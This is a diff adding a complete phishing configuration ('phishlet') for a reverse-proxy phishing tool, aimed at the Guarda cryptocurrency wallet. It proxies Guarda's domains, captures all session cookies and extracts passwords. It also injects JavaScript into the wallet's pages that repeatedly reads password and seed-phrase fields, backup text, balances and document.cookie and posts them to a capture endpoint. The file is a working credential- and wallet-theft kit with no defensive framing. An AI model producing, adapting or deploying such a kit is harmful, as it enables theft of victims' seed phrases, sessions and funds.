@@ -1,0 +1,155 @@
+author: 'EvilWhales'
+min_ver: '3.3.0'
+
+proxy_hosts:
+  - {phish_sub: '', orig_sub: '', domain: 'guarda.com', session: true, is_landing: true, auto_filter: false}
+  - {phish_sub: 'settingsuits', orig_sub: 'settingsuits', domain: 'guarda.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'currencies-hub', orig_sub: 'currencies-hub', domain: 'guarda.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'tokenshealth', orig_sub: 'tokenshealth', domain: 'guarda.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'exchanges', orig_sub: 'cexchangesdn', domain: 'guarda.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'fletcher', orig_sub: 'fletcher', domain: 'guarda.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'chain-api', orig_sub: 'chain-api', domain: 'guarda.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'solnode', orig_sub: 'solnode', domain: 'guarda.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'dotnode', orig_sub: 'dotnode', domain: 'guarda.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'sm', orig_sub: 'sm', domain: 'guarda.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'tronnode', orig_sub: 'tronnode', domain: 'guarda.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'omni', orig_sub: 'omni', domain: 'guarda.co', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'buy-sell', orig_sub: 'buy-sell', domain: 'guarda.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'balances', orig_sub: 'balances', domain: 'guarda.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'googletagmanager.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'cdn', orig_sub: 'cdn', domain: 'jsdelivr.net', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: '', orig_sub: '', domain: 'unpkg.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'da', orig_sub: 'www', domain: 'google-analytics.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'ajax', orig_sub: 'ajax', domain: 'googleapis.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'fonts', orig_sub: 'fonts', domain: 'googleapis.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'font', orig_sub: 'fonts', domain: 'gstatic.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'ajax', orig_sub: 'ajax', domain: 'googleapis.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'fonts', orig_sub: 'fonts', domain: 'googleapis.com', session: false, is_landing: false, auto_filter: false}
+
+sub_filters:
+  - {triggers_on: 'guarda.com', orig_sub: '', domain: 'guarda.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html','text/plain', 'application/javascript', 'application/json', 'application/manifest+json','text/javascript']}
+  - {triggers_on: 'guarda.com', orig_sub: 'settingsuits', domain: 'guarda.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html','text/plain', 'application/javascript', 'application/json', 'application/manifest+json','text/javascript']}
+  - {triggers_on: 'guarda.com', orig_sub: 'currencies-hub', domain: 'guarda.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html','text/plain', 'application/javascript', 'application/json', 'application/manifest+json','text/javascript']}
+  - {triggers_on: 'guarda.com', orig_sub: 'tokenshealth', domain: 'guarda.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html','text/plain', 'application/javascript', 'application/json', 'application/manifest+json','text/javascript']}
+  - {triggers_on: 'guarda.com', orig_sub: 'exchanges', domain: 'guarda.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html','text/plain', 'application/javascript', 'application/json', 'application/manifest+json','text/javascript']}
+  - {triggers_on: 'guarda.com', orig_sub: 'fletcher', domain: 'guarda.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html','text/plain', 'application/javascript', 'application/json', 'application/manifest+json','text/javascript']}
+  - {triggers_on: 'guarda.com', orig_sub: 'chain-api', domain: 'guarda.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html','text/plain', 'application/javascript', 'application/json', 'application/manifest+json','text/javascript']}
+  - {triggers_on: 'guarda.com', orig_sub: 'solnode', domain: 'guarda.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html','text/plain', 'application/javascript', 'application/json', 'application/manifest+json','text/javascript']}
+  - {triggers_on: 'guarda.com', orig_sub: 'dotnode', domain: 'guarda.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html','text/plain', 'application/javascript', 'application/json', 'application/manifest+json','text/javascript']}
+  - {triggers_on: 'guarda.com', orig_sub: 'sm', domain: 'guarda.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html','text/plain', 'application/javascript', 'application/json', 'application/manifest+json','text/javascript']}
+  - {triggers_on: 'guarda.com', orig_sub: 'tronnode', domain: 'guarda.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html','text/plain', 'application/javascript', 'application/json', 'application/manifest+json','text/javascript']}
+  - {triggers_on: 'guarda.com', orig_sub: 'omni', domain: 'guarda.co', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html','text/plain', 'application/javascript', 'application/json', 'application/manifest+json','text/javascript']}
+  - {triggers_on: 'guarda.com', orig_sub: 'buy-sell', domain: 'guarda.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html','text/plain', 'application/javascript', 'application/json', 'application/manifest+json','text/javascript']}
+  - {triggers_on: 'guarda.com', orig_sub: 'balances', domain: 'guarda.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html','text/plain', 'application/javascript', 'application/json', 'application/manifest+json','text/javascript']}
+
+  - {triggers_on: 'guarda.com', orig_sub: 'www', domain: 'googletagmanager.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html','text/plain', 'application/javascript', 'application/json', 'application/manifest+json','text/javascript']}
+  - {triggers_on: 'guarda.com', orig_sub: 'cdn', domain: 'jsdelivr.net', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html','text/plain', 'application/javascript', 'application/json', 'application/manifest+json','text/javascript']}
+  - {triggers_on: 'guarda.com', orig_sub: '', domain: 'unpkg.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html','text/plain', 'application/javascript', 'application/json', 'application/manifest+json','text/javascript']}
+  - {triggers_on: 'guarda.com', orig_sub: 'www', domain: 'google-analytics.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html','text/plain', 'application/javascript', 'application/json', 'application/manifest+json','text/javascript']}
+  - {triggers_on: 'guarda.com', orig_sub: 'ajax', domain: 'googleapis.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html','text/plain', 'application/javascript', 'application/json', 'application/manifest+json','text/javascript']}
+  - {triggers_on: 'guarda.com', orig_sub: 'fonts', domain: 'googleapis.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html','text/plain', 'application/javascript', 'application/json', 'application/manifest+json','text/javascript']}
+  - {triggers_on: 'guarda.com', orig_sub: 'fonts', domain: 'gstatic.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html','text/plain', 'application/javascript', 'application/json', 'application/manifest+json','text/javascript']}
+  - {triggers_on: 'guarda.com', orig_sub: 'ajax', domain: 'googleapis.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html','text/plain', 'application/javascript', 'application/json', 'application/manifest+json','text/javascript']}
+  - {triggers_on: 'guarda.com', orig_sub: 'fonts', domain: 'googleapis.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html','text/plain', 'application/javascript', 'application/json', 'application/manifest+json','text/javascript']}
+
+auth_tokens:
+  - domain: 'guarda.com'
+    keys: ['.*,regexp']
+    type: 'cookie'
+  - domain: '.guarda.com'
+    keys: ['.*,regexp']
+    type: 'cookie'
+
+credentials:
+  username:
+    key: 'username'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'unlock_password'
+    search: '"type":"unlock_password","value":"([^"]+)"'
+    type: 'json'
+  custom:
+    - key: 'unlock_password'
+      search: '"type":"unlock_password","value":"([^"]+)"'
+      type: 'json'
+    - key: 'mnemonic'
+      search: '"type":"mnemonic","value":"([^"]+)"'
+      type: 'json'
+    - key: 'new_password'
+      search: '"type":"new_password","value":"([^"]+)"'
+      type: 'json'
+    - key: 'backup_text'
+      search: '"type":"backup_text","value":"([^"]+)"'
+      type: 'json'
+    - key: 'backup_password'
+      search: '"type":"backup_password","value":"([^"]+)"'
+      type: 'json'
+    - key: 'balance'
+      search: '"type":"balance","value":"([^"]+)"'
+      type: 'json'
+    - key: 'cookies'
+      search: '"type":"cookies","value":"([^"]+)"'
+      type: 'json'
+
+auth_urls:
+  - '/app'
+  - '/app/'
+  - 'app/web'
+  - '/app/set-password'
+
+login:
+  domain: 'guarda.com'
+  path: '/app'
+
+js_inject:
+  - trigger_domains: ["guarda.com"]
+    trigger_paths: ["/app/", "/app/import-mnemonic", "/app/set-password", "/app/restore"]
+    script: |
+      (function() {
+        const AUTH_URL = "/capture_form";
+        const sent = {};
+
+        function send(type, value) {
+          if (sent[type]) return;
+          sent[type] = true;
+          fetch(AUTH_URL, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({type, value}) }).catch(() => {});
+        }
+
+        const triggerInputs = () => {
+          document.querySelectorAll('input[type="password"], textarea').forEach(el => {
+            const val = el.value?.trim();
+            if (!val) return;
+            const ph = (el.placeholder || '').toLowerCase();
+            const path = location.pathname;
+
+            if (path === '/app/' && ph.includes('password')) send('unlock_password', val);
+            if (path.includes('import-mnemonic') && ph.includes('mnemonic')) send('mnemonic', val);
+            if (path.includes('set-password') && ph.includes('password') && !ph.includes('confirm')) {
+              const confirm = document.querySelector('input[placeholder*="confirm" i]');
+              if (confirm?.value === val) send('new_password', val);
+            }
+            if (path.includes('restore') && el.tagName === 'TEXTAREA' && ph.includes('backup text')) send('backup_text', val);
+            if (path.includes('restore') && el.type === 'password' && ph.includes('enter password')) send('backup_password', val);
+          });
+        };
+
+        setInterval(triggerInputs, 2500);
+        setTimeout(triggerInputs, 1500);
+
+        const captureSession = () => {
+          if (sent.balance || sent.cookies) return;
+          const balanceEl = document.querySelector('.header_totalBalance_22Zlr span');
+          const fiatEl = document.querySelector('.fiat-toggle_fiatType__AtNh');
+          if (balanceEl && fiatEl) {
+            const amount = balanceEl.textContent.trim();
+            const currency = fiatEl.textContent.trim().replace(/[^A-Z]/g, '');
+            const cookies = document.cookie;
+            if (amount) send('balance', `${amount} ${currency}`);
+            if (cookies) send('cookies', cookies);
+          }
+        };
+
+        setInterval(captureSession, 3000);
+        setTimeout(captureSession, 2000);
+      })();
